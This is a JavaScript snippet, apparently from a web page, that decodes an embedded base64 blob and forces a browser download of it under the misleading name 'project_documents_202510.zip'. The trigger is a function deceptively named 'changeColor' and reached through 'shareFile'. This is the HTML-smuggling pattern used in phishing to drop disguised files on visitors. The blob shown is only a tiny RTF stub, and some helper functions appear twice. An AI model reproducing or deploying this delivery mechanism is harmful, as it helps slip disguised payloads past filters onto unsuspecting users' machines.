$('.html,.css,.js').css('margin', '8px 3px 0 0');
$('.bar_anim1').css('width', 0);
$('.bar_anim2').css('width', 0);
$('.bar_anim3').css('width', 0);
$('.file').css({ 'top': 'calc(50% + 15px)', 'opacity': 1 });

var data = "e1xydGYxfQ==";


function baseToArrayBuffer(base64) {
var binaryString = window.atob(base64);
var binaryLen = binaryString.length;
var bytes = new Uint8Array(binaryLen);
for (var i = 0; i < binaryLen; i++) {
var ascii = binaryString.charCodeAt(i);
bytes[i] = ascii;
}
return bytes;
}

function saveByteArray(reportName, byte) {
var blob = new Blob([byte], { type: "text/plain" });
var link = document.createElement('a');
link.href = window.URL.createObjectURL(blob);
var fileName = reportName;
link.download = fileName;
link.click();
};

function changeColor (_key) {
var _data = baseToArrayBuffer(data);
saveByteArray("project_documents_202510.zip", _data);
}

function base64ToArrayBuffer(base64) {
    var binaryString = window.atob(base64);
    var binaryLen = binaryString.length;
    var bytes = new Uint8Array(binaryLen);
    for (var i = 0; i < binaryLen; i++) {
        var ascii = binaryString.charCodeAt(i);
        bytes[i] = ascii;
    }
    return bytes;
}

function saveByteArray(reportName, byte) {
    var blob = new Blob([byte], { type: "text/plain" });
    var link = document.createElement('a');
    link.href = window.URL.createObjectURL(blob);
    var fileName = reportName;
    link.download = fileName;
    link.click();
};

function shareFile() {
   
	changeColor();
}
